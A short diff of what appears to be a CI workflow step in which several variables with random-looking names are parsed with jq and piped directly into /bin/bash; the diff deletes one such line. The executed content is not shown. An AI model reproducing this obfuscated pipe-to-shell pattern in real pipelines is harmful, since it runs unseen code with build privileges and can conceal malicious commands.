@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$wmhe1785" | jq -r .alf40142 | /bin/bash
           echo $htyn2 | jq -r .blglr52 | /bin/bash
-          echo $kgken233 | jq -r .ocsjz3 | /bin/bash
           echo $e480 | jq -r .zild2 | /bin/bash
           printf '%s' "$q59798" | jq -r .x60 | /bin/bash
 
